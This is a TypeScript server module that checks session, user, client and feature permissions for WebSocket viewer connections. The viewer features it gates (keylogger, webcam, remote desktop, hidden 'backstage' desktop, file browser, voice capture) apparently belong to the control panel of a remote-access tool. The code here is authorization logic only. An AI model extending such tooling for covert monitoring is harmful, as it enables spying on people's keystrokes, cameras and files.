import type { ServerWebSocket } from "bun";
import { getSessionByTokenHash } from "../db";
import { hasPermission } from "../rbac";
import type { SocketData, SocketRole } from "../sessions/types";
import {
  canUserAccessClient,
  canUserAccessFeature,
  getUserById,
  type FeatureName,
} from "../users";

const VIEWER_FEATURES: Partial<Record<SocketRole, FeatureName>> = {
  console_viewer: "console",
  rd_viewer: "remote_desktop",
  backstage_viewer: "backstage",
  webcam_viewer: "webcam",
  file_browser_viewer: "file_browser",
  process_viewer: "processes",
  keylogger_viewer: "keylogger",
  voice_viewer: "voice",
  desktop_audio_viewer: "voice",
};

const GLOBAL_VIEWER_ROLES = new Set<SocketRole>([
  "notifications_viewer",
  "dashboard_viewer",
  "chat_viewer",
]);

const activeViewerSockets = new Set<ServerWebSocket<SocketData>>();

function deny(ws: ServerWebSocket<SocketData>, reason: string): false {
  activeViewerSockets.delete(ws);
  try {
    ws.close(1008, reason);
  } catch {}
  return false;
}

export function isAuthenticatedViewerRole(role: SocketRole): boolean {
  return VIEWER_FEATURES[role] !== undefined || GLOBAL_VIEWER_ROLES.has(role);
}

export function validateViewerAuthorization(ws: ServerWebSocket<SocketData>): boolean {
  const role = ws.data?.role;
  if (!isAuthenticatedViewerRole(role)) return true;

  const { authTokenHash, userId } = ws.data;
  if (!authTokenHash || userId === undefined) {
    return deny(ws, "Authentication expired");
  }

  const session = getSessionByTokenHash(authTokenHash);
  const now = Math.floor(Date.now() / 1000);
  if (!session || session.userId !== userId || session.expiresAt <= now) {
    return deny(ws, "Authentication expired");
  }

  const user = getUserById(userId);
  if (!user) return deny(ws, "Authentication expired");

  ws.data.userRole = user.role;
  ws.data.username = user.username;

  const feature = VIEWER_FEATURES[role];
  if (feature) {
    if (!canUserAccessClient(userId, user.role, ws.data.clientId)) {
      return deny(ws, "Forbidden: client access denied");
    }
    if (!canUserAccessFeature(userId, user.role, feature)) {
      return deny(ws, "Forbidden: feature access denied");
    }
  }

  if (role === "chat_viewer" && !hasPermission(user.role, "chat:write", userId)) {
    return deny(ws, "Forbidden: chat access denied");
  }

  return true;
}

export function registerViewerSocket(ws: ServerWebSocket<SocketData>): boolean {
  if (!validateViewerAuthorization(ws)) return false;
  activeViewerSockets.add(ws);
  return true;
}

export function unregisterViewerSocket(ws: ServerWebSocket<SocketData>): void {
  activeViewerSockets.delete(ws);
}

export function revalidateActiveViewerSockets(): void {
  for (const ws of activeViewerSockets) validateViewerAuthorization(ws);
}

const viewerAuthTimer = setInterval(revalidateActiveViewerSockets, 5_000);
(viewerAuthTimer as any).unref?.();
